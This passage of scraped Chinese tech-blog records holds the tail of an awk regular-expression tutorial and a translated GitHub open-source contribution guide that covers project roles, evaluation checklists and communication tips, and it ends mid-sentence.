class=\"crayon-sy\">}</span><span class=\"crayon-v\">d</span><span class=\"crayon-o\">/</span><span class=\"crayon-h\">    </span>表示字母<span class=\"crayon-h\"> </span><span class=\"crayon-s\">\"o\"</span><span class=\"crayon-h\"> </span>只能可以出现<span class=\"crayon-h\"> </span><span class=\"crayon-cn\">2</span><span class=\"crayon-h\"> </span>次或者<span class=\"crayon-h\"> </span><span class=\"crayon-cn\">3</span><span class=\"crayon-h\"> </span>次</div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bd11b2b001066727576-2\"><span class=\"crayon-o\">/</span><span class=\"crayon-e\">go</span><span class=\"crayon-sy\">{</span><span class=\"crayon-cn\">2</span><span class=\"crayon-sy\">,</span><span class=\"crayon-cn\">10</span><span class=\"crayon-sy\">}</span><span class=\"crayon-v\">d</span><span class=\"crayon-o\">/</span><span class=\"crayon-h\">   </span>表示字母<span class=\"crayon-h\"> </span><span class=\"crayon-s\">\"o\"</span><span class=\"crayon-h\"> </span>只能可以出现<span class=\"crayon-h\"> </span><span class=\"crayon-cn\">2</span>次，<span class=\"crayon-cn\">3</span>次，<span class=\"crayon-cn\">4</span>次，<span class=\"crayon-cn\">5</span>次，<span class=\"crayon-cn\">6</span>次<span class=\"crayon-h\"> </span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span><span class=\"crayon-h\"> </span>一直到<span class=\"crayon-h\"> </span><span class=\"crayon-cn\">10</span><span class=\"crayon-h\"> </span>次</div><div class=\"crayon-line\" id=\"crayon-594bd11b2b001066727576-3\"><span class=\"crayon-o\">/</span><span class=\"crayon-e\">go</span><span class=\"crayon-sy\">{</span><span class=\"crayon-cn\">2</span><span class=\"crayon-sy\">,</span><span class=\"crayon-sy\">}</span><span class=\"crayon-v\">d</span><span class=\"crayon-o\">/</span><span class=\"crayon-h\">     </span>表示字母<span class=\"crayon-h\"> </span><span class=\"crayon-s\">\"o\"</span><span class=\"crayon-h\"> </span>必须至少出现<span class=\"crayon-h\"> </span><span class=\"crayon-cn\">2</span><span class=\"crayon-h\"> </span>次或着<span class=\"crayon-h\"> </span><span class=\"crayon-cn\">2</span><span class=\"crayon-h\"> </span>次以上</div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0018 seconds] -->\r\n<p><strong>正则表达式中的圆括号的用法</strong></p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-594bd11b2b004391336980\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-mac print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n$ awk '/th(in){1}king/{print $0}' poetry.txt\r\nThere is nothing either good or bad, but thinking makes it so</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-594bd11b2b004391336980-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bd11b2b004391336980-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-594bd11b2b004391336980-1\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">awk</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">'/th(in){1}king/{print $0}'</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">poetry</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">txt</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bd11b2b004391336980-2\"><span class=\"crayon-e\">There </span><span class=\"crayon-st\">is</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">nothing </span><span class=\"crayon-e\">either </span><span class=\"crayon-e\">good </span><span class=\"crayon-st\">or</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">bad</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">but </span><span class=\"crayon-e\">thinking </span><span class=\"crayon-e\">makes </span><span class=\"crayon-e\">it </span><span class=\"crayon-v\">so</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0008 seconds] -->\r\n<p>正则表达式中的圆括号表示将多个字符当成一个完整的对象来看待。比如 <code>/th(in){1}king/</code> 就表示其中字符串 “in” 必须出现 1 次。而如果不加圆括号就变成了 <code>/thin{1}king/</code> 这个就表示其中字符 “n” 必须出现 1 次。</p>\n<p>看到这里，如果你对 poetry.txt 件中写的诗比较熟悉，你就会发现。。。我去！这诗根本就不是我写的。所以论多读书是多么的重要。我有幸借用莎士比亚的诗来向你讲解如何在 awk 中使用正则表达式。现在该想想晚上吃什么，晚上去吃火锅。。。—_—</p>\n<h2 id=\"h2_0\">使用 awk 的一些总结</h2>\n<p>因为 awk 算起来也是一种编程语言，它的功能远远不止我们上面讲的这些，awk 还有一些其他比较复杂的功能。但一般我们不建议将 awk 用的太过于复杂。通常面对一些比较复杂的场景我们还是要使用其他的一些工具，比如 shell 脚本，Lua 等等……</p>\n\r\n        \r\n        \r\n        \n    <div class=\"post-adds\">\n        <span data-post-id=\"111002\" class=\" btn-bluet-bigger href-style vote-post-up   register-user-only \"><i class=\"fa  fa-thumbs-o-up\"></i> <h10 id=\"111002votetotal\">1</h10> 赞</span>\n        <span data-book-type=\"1\" data-site-id=\"2\" data-item-id=\"111002\" data-item-type=\"1\" class=\" btn-bluet-bigger href-style bookmark-btn  register-user-only \"><i class=\"fa fa-bookmark-o  \"></i> 6 收藏</span>\n\n                    <a href=\"#article-comment\"><span class=\"btn-bluet-bigger href-style hide-on-480\"><i class=\"fa fa-comments-o\"></i>  评论</span></a>\n        \n        \n        \n        <!-- JiaThis Button BEGIN -->\n        <div class=\"jiathis_style_24x24\" style=\"display: inline-flex; position: relative; margin: 0; clear: both;float: right;\">\n            <a class=\"jiathis_button_tsina\"></a>\n            <a class=\"jiathis_button_weixin\"></a>\n            <a class=\"jiathis_button_qzone\"></a>\n            <a class=\"jiathis_button_fb hide-on-480\"></a>\n            <a href=\"http://www.jiathis.com/share?uid=1745061\" class=\"jiathis jiathis_txt jiathis_separator jtico jtico_jiathis\" target=\"_blank\"></a>\n        </div>\n\n    </div>\n\n\n\n\r\n        <!-- BEGIN #author-bio -->\r\n\r\n\r\n<!-- END #author-bio -->\r\n\t</div>", "front_image_url": ["http://jbcdn2.b0.upaiyun.com/2015/10/58e81f3ff36189eef0d754b03017307d.jpg"], "fav_nums": 6, "comment_nums": 0, "create_date": "2017/05/17", "praise_nums": 1}
{"tags": "开源,开发", "front_image_path": "full/dd36e1ac9db2af41888b4a17b76a865bb91d4510.jpg", "title": "新人必看的开源指南：如何参与并做贡献", "url_object_id": "86b2553cf3632cf939fdb658d74ed475", "url": "http://blog.jobbole.com/111204/", "content": "<div class=\"entry\">\r\n\r\n        \t\t\t<div class=\"textwidget\"></div>\n\t\t\r\n\t\t<div class=\"copyright-area\">本文由 <a href=\"http://blog.jobbole.com\">伯乐在线</a> - <a href=\"http://www.jobbole.com/members/qdoverture\">效楚</a> 翻译，<a href=\"http://www.jobbole.com/members/paradise_FD\">郑芸</a> 校稿。未经许可，禁止转载！<br>英文出处：<a target=\"_blank\" href=\"https://opensource.guide/how-to-contribute/\">Open Source Guides</a>。欢迎加入<a target=\"_blank\" href=\"http://group.jobbole.com/category/feedback/trans-team/\">翻译组</a>。</div><p>【伯乐在线导读】：对程序员而言，参与开源有着难以置信的回报，比如有一个自己的出色开源项目，在技术面试能增色很多，极大加分。所以，越来越多的人在参与到开源运动中来。但对应很多新手来说，如何参与开源做出第一个贡献，如何发起一个新项目，却成了一个问题。</p>\n<p>2月14日，GitHub 官博发文宣告正式推出「开源指南」，旨在方便想参与到开源的个人和组织。「开源指南」是一个系列集合，内容简洁明了，分了 10 个方面。伯乐在线在本文中翻译了首篇。</p>\n<p> </p>\n<h1 style=\"text-align: center;\">怎样为开源做贡献</h1>\n<p style=\"text-align: center;\"><span style=\"color: #808080;\"><span id=\"pos_placeholder\" style=\"width: 0px; height: 0px; margin: 0px; padding: 0px;\"></span>想为开源做贡献吗？这是一份写给新手和老手的开源贡献指南。</span></p>\n<p><img class=\"aligncenter\" src=\"https://opensource.guide/assets/images/illos/contribute.svg\" alt=\"How to Contribute to Open Source Illustration\" width=\"600\" height=\"411\"></p>\n<p> </p>\n<h2 style=\"text-align: center;\">第一部分：为何要为开源做贡献？</h2>\n<p><img class=\"pquote-avatar aligncenter\" src=\"https://avatars2.githubusercontent.com/u/134585?v=3&amp;s=400\" alt=\"avatar\" width=\"168\" height=\"168\"></p>\n<blockquote><p>在 freenode 的工作使我学到了很多技能，后来我将它们运用到我的大学学习和实际工作中。我认为在开源项目中的工作对我的帮助和它对项目本身的帮助一样大！— <a href=\"https://github.com/errietta\">@errietta</a>，<a href=\"https://www.errietta.me/blog/open-source/\">《为什么我热爱为开源软件做贡献》</a></p></blockquote>\n<p>为开源做贡献是学习、教学和在你能想象的任何技能上积累经验的有益途径。</p>\n<p>为什么人们为开源做贡献？有许多理由！</p>\n<h3>提升现有技能</h3>\n<p>不管是写代码、用户界面设计、平面造型设计、写作，或是规划，如果你在寻找实践机会，在开源项目中总有适合你的任务。</p>\n<h3>结识爱好相似的人</h3>\n<p>拥有热情而友好的团体组织的开源项目使人们在多年以来常常回访。许多人通过参与开源成了一辈子的好朋友，无论是在会议中碰面还是深夜里线上聊玉米煎饼。</p>\n<h3>找到导师和教导他人</h3>\n<p>在共享的项目中与他人一起工作，意味着你必须解释你做事的方式，此外还要寻求他人的帮助。学习和教导，对参与其中的所有人都是一种满足的活动。</p>\n<h3>开发公开作品，帮你提升声望（和事业）</h3>\n<p>根据定义，你的所有开源工作都是公开的，这意味着你得到了免费的样本，可以带到任何地方，作为你能做事情的证明。</p>\n<h3>学习交际能力</h3>\n<p>开源提供了练习领导才能和管理技能的机会，比如解决冲突、组织不同团队的人，和给工作排优先级。</p>\n<h3>人人都可以参与改变，不分大小</h3>\n<p>你不一定要成为终生的贡献者才能享受参与开源的乐趣。你是否曾在网站上看到一个拼写错误，希望某人会修正它？在开源项目中，你就能做到这点。开源帮助人们在他们的生命中和他们对世界的体验中感受到力量，这本身是令人满足的。</p>\n<p> </p>\n<h2 style=\"text-align: center;\">第二部分：贡献意味着什么</h2>\n<p><span style=\"color: #808080;\">如果你是一个开源贡献方面的新人，这个过程可能是令人生畏的。怎么找到合适的项目？不会写代码怎么办？某件事出岔子了会怎样？</span></p>\n<p>不用担心！有各种各样的方法参与开源项目，并且有几个诀窍会帮你最大程度地运用你的经验。</p>\n<h3>你不一定要贡献代码</h3>\n<p>关于为开源做贡献，一个常见的误解是你必须贡献代码。事实上，常常是项目中非代码的部分<a href=\"https://github.com/blog/2195-the-shape-of-open-source\">大多被遗漏和忽视了</a>。通过参与提供非代码的贡献，你会给项目做出巨大的帮助！</p>\n<p><a href=\"http://jbcdn2.b0.upaiyun.com/2017/02/7ab7f1874d4a25554fee3293e617dafd.png\"><img class=\"wp-image-63251 size-thumbnail aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2017/02/7ab7f1874d4a25554fee3293e617dafd-150x150.png\" alt=\"49038\" width=\"150\" height=\"150\"></a></p>\n<blockquote><p><span style=\"color: #808080;\">我因为在 CocoaPods 中的工作出名，但大多数人不知道实际上我在 CocoaPods 工具本身上并没有做任何实际的工作。我在这个项目上花费的时间，大部分是在做诸如文档和品牌推广工作之类的事情。</span><span style=\"color: #808080;\">— <a href=\"https://github.com/orta\">@orta</a>，<a href=\"https://realm.io/news/orta-therox-moving-to-oss-by-default/\">《</a></span><a href=\"https://realm.io/news/orta-therox-moving-to-oss-by-default/\">默认转向开源软件</a><span style=\"color: #808080;\"><a href=\"https://realm.io/news/orta-therox-moving-to-oss-by-default/\">》</a></span></p></blockquote>\n<p>即使你是一名开发者，非代码贡献也是参与项目并结识其它团体成员的极好方式。建立那样的关系，将给予你在项目的其它部分工作的机会。</p>\n<p><a href=\"http://jbcdn2.b0.upaiyun.com/2017/02/6f9a20eea8324162d89ab86e19ff52f0.jpg\"><img class=\"size-thumbnail wp-image-63252 aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2017/02/6f9a20eea8324162d89ab86e19ff52f0-150x150.jpg\" alt=\"54418\" width=\"150\" height=\"150\"></a></p>\n<blockquote><p><span style=\"color: #808080;\">我初次接触 Python 开发组（也叫做 python-dev）是在 2002 年 6 月 17 日，我就接受我的补丁事宜向邮件列表发电子邮件。很快我发现了开源中的一个 bug，并决定把这个错误写成邮件摘要汇报给小组。我对这个主题做了澄清，他们为麻烦我做这件事而表示了大大的歉意。但更关键的是，当某人指出的某些东西需要修正时，我能够看到的。</span><span style=\"color: #808080;\">— <a href=\"https://github.com/brettcannon\">@brettcannon</a>, <a href=\"https://github.com/open-source/stories/brettcannon\">“Maintainer Stories”</a></span></p></blockquote>\n<h3>你是否喜欢活动规划？</h3>\n<ul>\n<li>组织关于项目的专题讨论会或聚会，<a href=\"https://github.com/nodeschool/organizers/issues/406\">就像 @fzamperin 为 NodeSchool 所做的那样</a>。</li>\n<li>组织项目会议（如果他们有的话）</li>\n<li>帮助团体成员找到合适的会议并提交演讲提议</li>\n</ul>\n<h3>你是否喜欢设计？</h3>\n<ul>\n<li>调整布局以提高项目的可用性</li>\n<li>做用户调查以重新组织和改善项目的导航和菜单，<a href=\"https://www.drupal.org/community-initiatives/drupal-core/usability\">就像 Drupal 建议的那样</a>。</li>\n<li>制订风格指南以帮助项目拥有一致的视觉设计</li>\n<li>为T恤或新的 logo 绘画，<a href=\"https://github.com/hapijs/contrib/issues/68\">就像 hapi.js 的贡献者所做的那样</a>。</li>\n</ul>\n<h3>你是否喜欢写作？</h3>\n<ul>\n<li>编写和改进项目文档</li>\n<li>组织一个示例文件夹，展示怎样使用项目</li>\n<li>开办项目通讯，或从邮件列表中组织重要内容</li>\n<li>为项目编写教程，<a href=\"https://github.com/pypa/python-packaging-user-guide/issues/194\">就像 pypa 的贡献者所做的那样</a>。</li>\n<li>翻译项目的文档</li>\n</ul>\n<p><a href=\"http://jbcdn2.b0.upaiyun.com/2017/02/856aa51181b62e90b4a511b9823ed53a.jpg\"><img class=\"size-thumbnail wp-image-63255 aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2017/02/856aa51181b62e90b4a511b9823ed53a-150x150.jpg\" alt=\"853712\" width=\"150\" height=\"150\"></a></p>\n<blockquote><p>说真的，“文档”极其重要。到目前为止，Babel（Kittens 的开源项目）的文档一直很棒，已经成为了它的杀手级特性。但是肯定还需要做一些工作加以完善，甚至加一些段落上去，对此我非常感激。<span style=\"color: #808080;\">— <a href=\"https://github.com/kittens\">@kittens</a>，<a href=\"https://github.com/babel/babel/issues/1347\">《需要贡献者》</a></span></p></blockquote>\n<h3>你是否喜欢组织？</h3>\n<ul>\n<li>链接重复的 Issue，给出新的 Issue 标签建议，让事情井井有条</li>\n<li>检查开放的 Issue ，提议关闭旧的 Issue ，<a href=\"https://github.com/Leaflet/Leaflet/issues/4528#issuecomment-216520560\">就像 @nzakas 为 eslint 所做的那样</a></li>\n<li>在最近开放的 Issue 中提有助于澄清的问题，把讨论向前推进</li>\n</ul>\n<h3>你是否喜欢写代码？</h3>\n<ul>\n<li>找一个开放的 Issue 着手处理，<a href=\"https://github.com/Leaflet/Leaflet/issues/4528#issuecomment-216520560\">就像 @dianjin 为 Leaflet 所做的那样</a></li>\n<li>问问你是否能帮忙写一个新特性</li>\n<li>自动化项目的设置</li>\n<li>提升工具和测试</li>\n</ul>\n<h3>你是否喜欢帮助他人？</h3>\n<ul>\n<li>在诸如 Stack Overflow（<a href=\"http://stackoverflow.com/questions/18664074/getting-error-peer-authentication-failed-for-user-postgres-when-trying-to-ge\">就像这个 Postgres 的例子一样</a>）或 reddit 之类的地方回答关于项目的问题</li>\n<li>在开放的 Issue 中为人们回答问题</li>\n<li>帮忙主持讨论版或会话通道（conversation channels）</li>\n</ul>\n<h3>你是否喜欢为他人的代码提供帮助？</h3>\n<ul>\n<li>审查他人提交的代码</li>\n<li>为如何使用项目写教程</li>\n<li>为其它贡献者提供指导，<a href=\"https://github.com/rust-lang/book/issues/123#issuecomment-238049666\">就像 @ereichert 在 Rust 上为 @bronzdoc 所做的那样</a></li>\n</ul>\n<h3>你并不非得要在软件项目中工作！</h3>\n<p>虽然“开源”通常指软件，但你可以在任何事情上协作。有书籍、食谱、清单和课程是作为开源项目开发的。</p>\n<p>例如：</p>\n<ul>\n<li><strong><a href=\"https://github.com/sindresorhus\">@sindresorhus</a> </strong>组织了一个<a href=\"https://github.com/sindresorhus/awesome\"> Awesome 的清单列表</a></li>\n<li><strong><a href=\"https://github.com/h5bp\">@h5bp</a> </strong>为前端开发求职者维护了一个<a href=\"https://github.com/h5bp/Front-end-Developer-Interview-Questions\">可能的面试问题的清单</a></li>\n<li><strong><a href=\"https://github.com/stuartlynn\">@stuartlynn</a></strong> 和 <strong><a href=\"https://github.com/nicole-a-tesla\">@nicole-a-tesla</a></strong> 制作了一份<a href=\"https://github.com/stuartlynn/puffin_facts\">关于 puffins 的有趣事实的集合</a></li>\n</ul>\n<p>即使你是一名软件开发者，在文档项目上的工作也能帮你在开源方面起步。在与代码无关的项目中工作常常不那么令人生畏，而且协作的过程将增强你的自信和经验。</p>\n<p> </p>\n<h2 style=\"text-align: center;\">第三部分：熟悉一个新项目</h2>\n<p><a href=\"http://jbcdn2.b0.upaiyun.com/2017/02/a98fc32a297faeb08c5f5ad46680c1fa.jpg\"><img class=\"size-thumbnail wp-image-63256 aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2017/02/a98fc32a297faeb08c5f5ad46680c1fa-150x150.jpg\" alt=\"1179362\" width=\"150\" height=\"150\"></a></p>\n<blockquote><p><span style=\"color: #808080;\">如果你去看一个 Issue 追踪器，发现事情看起来令人困惑，并不是只有你这样。这些工具需要大量的隐性知识，但人们能帮你驾驭它，你也能向他们提问。</span><span style=\"color: #808080;\">— <a href=\"https://github.com/shaunagm\">@shaunagm</a>，<a href=\"http://readwrite.com/2014/10/10/open-source-diversity-how-to-contribute/\">《怎样为开源做贡献》</a></span></p></blockquote>\n<p>对任何超过修正拼写错误的事情来说，为开源做贡献就像在社交聚会上走向一群陌生人。如果当他们正在深入讨论金鱼时，你开始谈论美洲鸵，他们可能有点奇怪地看着你。</p>\n<p>在带着你自己的建议盲目投入以前，先从学习怎样观察聚会中的人，参与他们讨论的话题开始。这样做能增加你的想法被注意到和听取的可能性。</p>\n<h3>开源项目剖析</h3>\n<p>每个开源团体都是不同的。</p>\n<p>在一个开源项目中花了若干年时间意味着你已经了解了一个开源项目。转向一个不同的项目，你可能会发现词汇、规范和沟通方式完全不同。</p>\n<p>即便如此，许多开源项目遵循着相似的组织结构。理解不同的团体角色和总体过程将帮你迅速熟悉任何新项目。</p>\n<p>一个典型的开源项目有以下几类人：</p>\n<ul>\n<li><strong>作者（Author）：</strong>创建该项目的人或组织。</li>\n<li><strong>所有者（Owner）：</strong>对组织或仓库（repository）拥有行政所有权的人（并不总和原始作者是同一个人）</li>\n<li><strong>维护者（Maintainers）：</strong>对推动愿景和管理项目的组织方面负有责任的贡献者。（他们可能也是项目的作者或所有者）</li>\n<li><strong>贡献者（Contributors）：</strong>每个对项目做出过某种贡献的人。</li>\n<li><strong>团体成员（Community Members）：</strong>使用项目的人。他们可能在对话中保持活跃或者对项目的方向表达他们的主张。</li>\n</ul>\n<p>大的项目可能还有下属委员会或工作组，他们致力于不同的任务，比如工具、分类（triage）、团体节制（community moderation）和活动组织。在项目的网站上寻找“team”页面，或者在仓库（repository）里寻找治理文档（governance documentation），来找到此类信息。</p>\n<p>项目也有文档。这些文件通常列在仓库（repository）的顶层。</p>\n<ul>\n<li><strong>许可证（LICENSE）：</strong>根据定义，每个开源项目必须有一个<a href=\"https://choosealicense.com/\">开源许可证</a>。如果项目没有许可证，那它就不是开源的。</li>\n<li><strong>自述文件（README）：</strong>自述文件是迎接项目的新团体成员的操作指南手册。它解释了为什么项目是有用的以及如何开始。</li>\n<li><strong>贡献（CONTRIBUTING）：</strong>自述文件帮助人们使用项目，而贡献文件帮助人们为项目做贡献。它解释了需要什么类型的贡献者以及这个过程是怎么工作的。虽然不是每个项目都有贡献文件，但它的存在表明这是一个欢迎做贡献的项目。\n<ul>\n<li><strong>行动守则（CODE_OF_CONDUCT）：</strong>行动守则为参与者的相关行为设定了基本准则，并且帮助促进一个友好而热情的环境。虽然不是每个项目都有行动守则文件，但它的存在表明这是一个欢迎做贡献的项目。</li>\n<li><strong>其它文档：</strong>可能有另外的文档，比如教程、演练（walkthroughs）或管理策略，尤其是在大项目中。</li>\n</ul>\n</li>\n</ul>\n<p>最后，开源项目使用以下工具来组织讨论。通读档案文件将为你很好地描绘该团体是怎样思考和工作的。</p>\n<ul>\n<li><strong> Issue 追踪器（Issue tracker）：</strong>人们讨论项目相关 Issue 的地方。</li>\n<li><strong>Pull requests：</strong>人们讨论和审查进行中的更改的地方。</li>\n<li><strong>讨论板或邮件列表：</strong>有些项目可能为会话主题使用这些通道（例如，“我怎样……”或“你认为……怎么样”，而不用 bug 报告或特性请求）。其它项目为所有会话使用 Issue 追踪器。</li>\n<li><strong>同步聊天通道（Synchronous chat channel）：</strong>有些项目为临时会话、协作和快速交流使用聊天通道（比如 Slack 或 IRC）。</li>\n</ul>\n<p> </p>\n<h2 style=\"text-align: center;\">第四部分：找到一个要做贡献的项目</h2>\n<p style=\"text-align: center;\"><span style=\"color: #808080;\">既然你已经弄明白开源项目是怎样工作的，是时候找到一个要做贡献的项目了！</span></p>\n<p>如果你之前从未为开源做过贡献，听听美国总统约翰·F·肯尼迪的建议，他曾经说：“不要问你的国家能为你做什么-问问你能为你的国家做什么。”</p>\n<p>为开源做贡献在所有层面和不同项目间都能发生。你不必对你的第一个确切的贡献是什么，或它看起来是什么样想得过多。</p>\n<p>相反地，从考虑你已经在使用的或想要使用的项目开始。你会积极地做贡献的项目正是你发现自己会回访的项目。</p>\n<p>在那些项目里，无论何时你发现自己想到某件事可以变的更好或不同，按照你的直觉行动吧。</p>\n<p>开源不是一个排外的俱乐部；它是由和你一样的人做出来的。“开源”只是一个花哨的术语，为了把世界上的问题都作为可修正的来处理。</p>\n<p>你可能会细看一份自述文件，发现一个断开的链接或一个拼写错误。或者，你是一个新用户，你发现某样东西毁坏了，或是一个 Issue 你认为实际上应该在文档中。与其忽略它并继续，或请求其他人修正它，不如看看你能不能参与帮忙。这就是开源的真谛！</p>\n<blockquote><p>对开源的<a href=\"http://www.igor.pro.br/publica/papers/saner2016.pdf\">非正式贡献中，有28%</a>是文档，比如拼写错误修正、重排格式，或翻译。</p></blockquote>\n<p>你也可以使用下列资源之一来帮你发现新项目：</p>\n<ul>\n<li><a href=\"https://github.com/explore/\">GitHub Explore</a></li>\n<li><a href=\"http://www.firsttimersonly.com/\">First Timers Only</a></li>\n<li><a href=\"https://yourfirstpr.github.io/\">Your First PR</a></li>\n<li><a href=\"https://www.codetriage.com/\">CodeTriage</a></li>\n<li><a href=\"https://24pullrequests.com/\">24 Pull Requests</a></li>\n<li><a href=\"http://up-for-grabs.net/\">Up For Grabs</a></li>\n<li><a href=\"https://contributor.ninja/\">Contributor-ninja</a></li>\n</ul>\n<h3>做贡献前的一份检查表</h3>\n<p>当你找到一个你想要做贡献的项目，做一个快速的浏览来确认该项目适合接受贡献。否则，你的努力工作可能永远得不到回应。</p>\n<p>这是一份便于使用的检查表，用来评估一个项目对新贡献者来说好不好。</p>\n<p><strong>满足开源的定义</strong></p>\n<ul>\n<li>它有没有许可证？通常，这是在仓库（repository）根目录里的一个叫做 LICENSE 的文件。</li>\n</ul>\n<p><strong>项目积极地接受贡献</strong></p>\n<p>看看主分支上的提交活动。在 GitHub 上，你可以在仓库的主页上看到此信息。</p>\n<ul>\n<li>最新的提交（commit）是在什么时候？</li>\n<li>项目有多少贡献者？</li>\n<li>人们提交频繁程度？（在 GitHub 上，你可以通过点击顶部横条里的“Commits”来找到此信息）</li>\n</ul>\n<p>下一步，看看项目的 Issue 。</p>\n<ul>\n<li>有多少开放的 Issue ？</li>\n<li>当 Issue 开放时，维护者是否快速地回应？</li>\n<li>对于 Issue 有没有活跃的讨论？</li>\n<li>Issue 是最近的吗？</li>\n<li>Issue 是否得到关闭？（在 GitHub 上，点击 Issue 页面上的“closed”标签来看已关闭的 Issue 。）</li>\n</ul>\n<p>现在对项目的 pull requests做同样的动作。</p>\n<ul>\n<li>有多少开放的 pull requests？</li>\n<li>当开放pull requests时， 维护者是否快速地回应？</li>\n<li>对于pull requests有没有活跃的讨论？</li>\n<li>pull requests是最近的吗？</li>\n<li>pull requests被合并是在多久之前？（在 GitHub 上，点击pull requests页面上的“closed”标签来看已关闭的pull requests。）</li>\n</ul>\n<h3>热情的项目</h3>\n<p>友好而热情的项目标志着他们乐于接受新的贡献者。</p>\n<ul>\n<li>维护者对于 Issue 中的问题是否作出有帮助的回应？</li>\n<li>人们在 Issue 、讨论板和聊天（例如 IRC 或 Slack）中是否友好？</li>\n<li>Pull Requests(PR) 功能是否得到审查（reviewed）？</li>\n<li>维护者对人们的贡献是否表示感谢？</li>\n</ul>\n<p><a href=\"http://jbcdn2.b0.upaiyun.com/2017/02/bfb4846c8eb1da9c00196e4ff6e7a4bc.png\"><img class=\"size-thumbnail wp-image-63257 aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2017/02/bfb4846c8eb1da9c00196e4ff6e7a4bc-150x150.png\" alt=\"401111\" width=\"150\" height=\"150\"></a></p>\n<blockquote><p>无论何时你看一个长的讨论帖，抽查一下较晚进入这个帖子的核心开发者的反应。他们是否作出建设性的总结，在做出决策和付诸实施时，是否同时还保持礼貌？如果你看到发生许多口水仗，那通常表明精力用在了争论而不是开发上。— <a href=\"https://github.com/kfogel\">@kfogel</a>，<a href=\"http://producingoss.com/en/evaluating-oss-projects.html\">创作开源软件</a></p></blockquote>\n<p> </p>\n<h2 style=\"text-align: center;\">第五部分：怎样提交贡献</h2>\n<p><span style=\"color: #808080;\">你已经找到一个你喜欢的项目，并且你已经准备好作出贡献。最后！这里告诉你怎样以正确的方式作出你的贡献。</span></p>\n<h3>有效的沟通</h3>\n<p>不管你是一次性的贡献者或是试着加入一个团体，与他人一起工作是你将在开源中发展的最重要的技能之一。</p>\n<p><a href=\"http://jbcdn2.b0.upaiyun.com/2017/02/e9b165e406b7ab077c16e1956b46ec80.jpg\"><img class=\"size-thumbnail wp-image-63258 aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2017/02/e9b165e406b7ab077c16e1956b46ec80-150x150.jpg\" alt=\"7693422\" width=\"150\" height=\"150\"></a></p>\n<blockquote><p>作为一个新贡献者，我很快认识到，如果我想要能关闭 Issue ，我必须提问。我浏览了代码库。一旦我对发生的事有了一些认识，我请求更多的指点。就是这样！在得到我需要的所有相关细节后，我能解答 Issue 了。—<a href=\"https://github.com/shubheksha\"> @shubheksha</a>，<a href=\"https://medium.freecodecamp.com/a-beginners-very-bumpy-journey-through-the-world-of-open-source-4d108d540b39#.pcswr2e78\">一个新手在开源世界中的颠簸旅途</a></p></blockquote>\n<p>在你打开一个 Issue 或使用pull request，或是在聊天中提问以前，记住这些要点可以使你的想法有效地被别人理解。</p>\n<p><strong>给出上下文。</strong>帮助他人快速赶上进度。如果你遇到一个错误，解释你正准备做什么和怎么重现它。如果你提出一个新主张，解释为什么你认为它对项目有用（不只是对你！）。</p>\n<blockquote><p>😇 “当我做 Y 时 X 没有发生”<br>\n😢 “X 